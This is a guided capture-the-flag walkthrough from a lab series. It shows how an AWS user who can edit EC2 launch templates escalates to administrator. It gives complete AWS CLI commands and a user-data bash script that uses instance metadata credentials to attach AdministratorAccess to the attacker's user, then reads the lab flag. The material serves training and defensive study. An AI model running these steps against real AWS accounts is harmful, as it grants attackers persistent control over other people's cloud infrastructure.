# Guided Walkthrough: Privilege Escalation via Launch Template Modification

This scenario demonstrates a sophisticated privilege escalation technique where an attacker with permissions to modify EC2 launch templates can change an existing administrative role configuration and inject malicious user data that will be executed when the next EC2 instance is launched. The combination of `ec2:CreateLaunchTemplateVersion` and `ec2:ModifyLaunchTemplate` permissions creates a powerful attack path that allows an attacker to "pre-stage" privilege escalation that activates automatically.

EC2 launch templates are commonly used with Auto Scaling Groups (ASGs) to define instance configuration including AMI, instance type, security groups, and crucially - the IAM instance profile and user data script. When an attacker can create a new version of a launch template and set it as the default, they control what configuration will be used for all future instance launches. This is particularly dangerous in environments with auto-scaling policies or scheduled instance launches, where the malicious configuration may activate without any further attacker interaction.

The attack works by creating a new launch template version that references an existing administrative IAM role (already configured in the template) and user data containing a script that grants the attacker's starting user administrative permissions. Notably, this attack does NOT require `iam:PassRole` permissions because the attacker is simply referencing a role that already exists in a previous template version. When the next instance launches (either through manual action, auto-scaling, or scheduled tasks), the instance receives full administrative permissions via its instance profile, and the user data script immediately modifies IAM policies to grant the attacker persistent admin access. This is a one-hop privilege escalation because the attacker goes directly from limited permissions to admin access through the compromised instance's actions.

## The Challenge

You have gained access to credentials for `pl-prod-ec2-005-to-admin-starting-user`. This IAM user has `ec2:CreateLaunchTemplateVersion` and `ec2:ModifyLaunchTemplate` permissions — enough to modify existing EC2 launch templates. Your goal is to use these permissions to escalate to the `pl-prod-ec2-005-to-admin-target-role` administrative role, which has `AdministratorAccess`.

There is already an EC2 launch template in the account (`pl-prod-ec2-005-to-admin-template`) whose earlier version references the administrative role. You don't need `iam:PassRole` — you're not passing a new role, you're just referencing one that's already in a prior template version.

## Reconnaissance

First, configure the starting user credentials from Terraform outputs and confirm your identity:

```bash
aws sts get-caller-identity
```

Next, discover the existing launch templates in the account:

```bash
aws ec2 describe-launch-templates --filters 'Name=tag:Scenario,Values=ec2-005'
```

This reveals `pl-prod-ec2-005-to-admin-template`. Inspect its existing versions to understand what's already configured — specifically, which IAM instance profile is attached:

```bash
aws ec2 describe-launch-template-versions \
  --launch-template-name pl-prod-ec2-005-to-admin-template
```

You'll see that an earlier version references `pl-prod-ec2-005-to-admin-target-role` as the instance profile. That's your target. If you also have `autoscaling:DescribeAutoScalingGroups`, you can check whether any ASG is using this template and set to launch automatically — in that case, you might not even need to trigger a launch yourself.

## Exploitation

### Step 1: Create a Malicious Launch Template Version

Craft a user data script that attaches `AdministratorAccess` to your starting user. The script needs to run on the instance as it boots, using the admin instance credentials from IMDS:

```bash
#!/bin/bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
REGION=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/placement/region)
aws iam attach-user-policy \
  --user-name pl-prod-ec2-005-to-admin-starting-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --region "$REGION"
```

Base64-encode that script and create a new launch template version sourced from version 1 (which has the admin role), replacing only the user data:

```bash
USER_DATA=$(echo '<your-script>' | base64 -w 0)

aws ec2 create-launch-template-version \
  --launch-template-name pl-prod-ec2-005-to-admin-template \
  --version-description 'malicious' \
  --source-version 1 \
  --launch-template-data "{\"UserData\":\"${USER_DATA}\"}"
```

By sourcing from version 1, the new version inherits the admin instance profile (`pl-prod-ec2-005-to-admin-target-role`) without you needing to explicitly pass it — no `iam:PassRole` required.

### Step 2: Set the New Version as Default

Make your malicious version the default so the next instance launch picks it up:

```bash
aws ec2 modify-launch-template \
  --launch-template-name pl-prod-ec2-005-to-admin-template \
  --default-version 2
```

### Step 3: Trigger an Instance Launch

Launch a t3.micro instance using the modified template:

```bash
aws ec2 run-instances \
  --launch-template 'LaunchTemplateName=pl-prod-ec2-005-to-admin-template,Version=$Default' \
  --instance-type t3.micro
```

The instance boots, receives the admin instance profile, pulls credentials from IMDS, and executes your user data payload — attaching `AdministratorAccess` to `pl-prod-ec2-005-to-admin-starting-user`.

## Verification

Wait for the instance to reach the running state and for the user data script to complete (typically 30-90 seconds), then verify the policy attachment:

```bash
aws iam list-attached-user-policies \
  --user-name pl-prod-ec2-005-to-admin-starting-user
```

You should see `AdministratorAccess` listed. Confirm with a privileged action using your starting user credentials:

```bash
aws iam list-users
```

If that returns a list of IAM users, privilege escalation is complete.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now granted to your starting user provides implicitly.

Using your starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/ec2-005-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited two EC2 permissions — `ec2:CreateLaunchTemplateVersion` and `ec2:ModifyLaunchTemplate` — to inject a malicious payload into an existing launch template that already had an administrative instance profile. Because you sourced the new version from an existing version that referenced the admin role, you never needed `iam:PassRole`. The instance launch acted as the execution vector, using the admin credentials from IMDS to modify IAM on your behalf.

This technique is especially dangerous in environments that use auto-scaling or scheduled instance launches, where the payload may fire automatically without any additional attacker interaction. The attacker gains persistent admin access that survives even if the EC2 instance is terminated.
